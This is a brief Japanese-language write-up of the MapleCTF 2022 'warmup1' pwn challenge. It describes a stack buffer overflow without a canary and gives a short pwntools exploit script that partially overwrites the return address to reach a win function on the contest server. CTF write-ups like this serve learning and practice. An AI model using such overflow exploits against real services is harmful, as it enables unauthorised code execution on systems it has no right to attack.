# MapleCTF 2022 `warmup1 [pwn]` writeup

## 問題
It's like warmup2, but easier.

`nc warmup1.ctf.maplebacon.org 1337`

実行ファイルが提供される。

## 解法
セキュリティ機構の確認から。

```
[*] '/home/caffeine/ctf/maplectf22/pwn/warmup1/chal'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
canaryがない。
デコンパイルしてみるとvuln()関数の中にBOFがあったのでret2winします。
PIE有効なので、リターンアドレスをpartial overwriteすればOK。

## Exploit
read関数で標準入力を受け取っているので終端に改行文字は必要なし (というか改行付与するとpartial overwriteが成立しない)。
Pwntoolsを使うなら、`sendline(payload)`だとpayloadの終端に改行を付与して`send(payload)`だと改行を付与しないという違いがある。

```py
from pwn import *
import sys

elf = ELF("chal")

# io = process(elf.path)
io = remote("warmup1.ctf.maplebacon.org", 1337)

payload = b'A' * 0x18
payload += b'\x19'

io.send(payload)
io.interactive()
```

FLAG: 記録し損ねました…